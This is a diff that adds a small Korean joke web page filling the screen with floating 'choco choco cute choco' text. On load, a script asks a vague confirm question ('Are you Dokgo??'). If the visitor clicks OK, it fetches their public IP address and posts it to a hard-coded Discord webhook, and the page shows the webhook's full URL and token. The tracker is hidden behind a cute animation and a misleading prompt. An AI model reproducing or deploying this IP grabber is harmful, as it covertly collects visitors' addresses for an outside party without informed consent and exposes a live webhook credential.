@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<title>초코초코 귀여운 초코 + IP 전송</title>
+<style>
+  body { margin:0; overflow:hidden; background:#fff0f6; font-family: sans-serif; }
+  .choco {
+    position: absolute;
+    color: #8B4513;
+    user-select: none;
+    pointer-events: none;
+    animation: float 5s ease-in-out infinite;
+  }
+  @keyframes float {
+    0%,100% { transform: translateY(0); }
+    50% { transform: translateY(-20px); }
+  }
+</style>
+</head>
+<body>
+
+<script>
+(async () => {
+  const consent = confirm("당신은 독고 입니까??");
+  if (!consent) return;
+
+  try {
+    const resp = await fetch("https://api.ipify.org?format=json");
+    const { ip } = await resp.json();
+
+    const webhookUrl = "https://discord.com/api/webhooks/1393594393247748177/u4zEKNERU3zHm-kbC6uY2pfb790RHz3sbEbTAtoD0zpcNT2gvaEAnlAaWggdmoAMfRIY"; // 여기에 웹훅 URL 입력
+    await fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: `📢 방문자의 IP 주소: ${ip}` })
+    });
+    console.log("IP 전송 완료:", ip);
+  } catch (err) {
+    console.error("IP 가져오기/전송 실패:", err);
+  }
+
+  // 화면에 "초코초코 귀여운 초코" 1000개 표시
+  for (let i = 0; i < 1000; i++) {
+    const el = document.createElement("div");
+    el.textContent = "초코초코 귀여운 초코";
+    el.className = "choco";
+    el.style.left = Math.random() * innerWidth + "px";
+    el.style.top = Math.random() * innerHeight + "px";
+    el.style.fontSize = (12 + Math.random() * 24) + "px";
+    document.body.appendChild(el);
+  }
+})();
+</script>
+
+</body>
+</html>
